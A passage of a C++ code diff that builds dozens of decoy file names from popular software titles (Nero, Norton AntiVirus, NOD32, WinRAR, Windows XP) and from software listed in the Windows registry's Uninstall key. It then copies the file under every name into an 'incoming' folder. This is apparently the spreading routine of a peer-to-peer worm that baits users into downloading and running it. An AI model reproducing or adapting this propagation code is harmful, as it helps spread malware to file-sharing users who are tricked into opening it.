+             lsoft.push_front(string("Nero Burning ROM 8.3.2.1 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 8.2.8.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 8.1.1.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 7.11.10.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 7.10.1.1 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 7.8.5.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 7.7.5.1 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 7.5.7.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 7.5.1.1 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 7.0.1.2 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 6.6.1.15a " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 6.6.1.4 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 6.6.0.8 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 6.0.0.9 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 5.5.10.56 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 5.5.9.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 5.5.4.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 5.5 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 5.0.0.3 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Norton AntiVirus 2009 16.0.0.125 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Norton AntiVirus 2008 15.5.0.23 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Norton AntiVirus 2008 15.0.0.58 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Norton AntiVirus 2007 14.2.0.29 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Norton AntiVirus 2007 14.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Norton AntiVirus 2006 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));             
+             lsoft.push_front(string("Nod32 Antivirus 3.0.684 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nod32 Antivirus 3.0.650 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nod32 Antivirus 3.0.414 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));             
+             lsoft.push_front(string("Nod32 Antivirus 2.70.26 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));             
+             lsoft.push_front(string("Nod32 Antivirus 2.51.26 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));             
+             lsoft.push_front(string("Nod32 Antivirus 2.51.20 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));             
+             lsoft.push_front(string("Nod32 Antivirus 2.50.39 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));             
+             lsoft.push_front(string("Nod32 Antivirus 2.12.3 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));             
+             lsoft.push_front(string("Nod32 Antivirus 2.12.2 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));             
+             lsoft.push_front(string("Quake III Arena " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Windows XP SP3 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Windows XP SP2 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Windows XP SP1 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));                          
+             lsoft.push_front(string("WinRAR 3.80 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.71 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.62 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.61 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.60 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.50 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.42 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.41 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.40 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.30 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.20 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.11 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));          
+          }
+          else {
+             sufix_filename = (char *) malloc(strlen(SUFIX) + 1);
+             strcpy(sufix_filename, SUFIX); 
+             
+             lsoft.push_front(string("C " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("C++ " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("C# " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("ADA " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("JAVA " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("HASKELL " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("VISUAL BASIC " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("PYTHON " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("PERL " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("DIV " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("IRC SCRIPTING " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("VISUAL C++ " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("ASP " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("ASP .NET " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("PHP " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("SQL " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("JAVASCRIPT " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("ACTION SCRIPT " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("BASIC " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename)))); 
+             lsoft.push_front(string("MIRANDA " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("LISP " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("FOLTRAN " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("SCHEME " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("OCAML " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("SCALA " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("PROLOG " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("BASH " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("RUBY " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("EIFFEL " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("DELPHI " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("SMALLTALK " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("JAVABEANS " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("JSP " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("HTML " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("XML " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("APPLETS " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("ACTIVEX " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("OCX " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("OPENGL " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("OGRE " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("LINUX " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("DEBIAN " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("UNIX " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("UBUNTU " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("SOLARIS " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("MACOS " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("CRACKING " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("HACKING " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("BUFFER OVERFLOW " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("SQL INJECTOR " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("FTP " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("HTTP " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("RDP " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("RFB " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("SMTP " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("POP3 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("IMAP " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("DCOM " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("NETBIOS " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("CISCO " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("FRAME RELAY " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("ATM " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("RDSI " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("OSI " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("TCP " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("IP " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));         
+          }
+          
+          /* PUSH DYNAMIC NAMES INTO FILENAME LIST */    
+          plsoft = WinReg->RegQueryEnumerationUninstallSoftware();
+          for (int i = 0; i < WinReg->getCountElems(); i++) {
+             if (**(plsoft + i) != '{') {
+                discardPattern[0] = **(plsoft + i); discardPattern[1] = *(*(plsoft + i) + 1); discardPattern[2] = '\x00';
+                if (strcmp(discardPattern, DISCARD_PATTERN1) != 0) {
+                   discardPattern[2] = *(*(plsoft + i) + 2); discardPattern[3] = '\x00';
+                   if (strcmp(discardPattern, DISCARD_PATTERN2) != 0) {
+                      softVersion = WinReg->RegQueryValue((char *) (string("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall") + string("\\") + string(*(plsoft + i))).c_str(), SOFTWARE_VERSION_KEY);
+                      if (softVersion != NULL) {
+                         lsoft.push_front(string(FunctionsStrings::removeSpecialCharacters(*(plsoft + i))) + string(" " + string(softVersion) + string(" ") + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+                         lsoft.push_front(string(FunctionsStrings::removeSpecialCharacters(*(plsoft + i))) + string(" " + string(softVersion) + string(" ") + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+                      }
+                      else {
+                         lsoft.push_front(string(FunctionsStrings::removeSpecialCharacters(*(plsoft + i))) + string(" " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+                         lsoft.push_front(string(FunctionsStrings::removeSpecialCharacters(*(plsoft + i))) + string(" " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+                      }
+                   }
+                }
+             }
+          }
+          
+          return FunctionsFiles::copyFileMultipleName(strFilename, incomingFolderFullPath, lsoft);   
+       }
+   }
+   return false;
+}
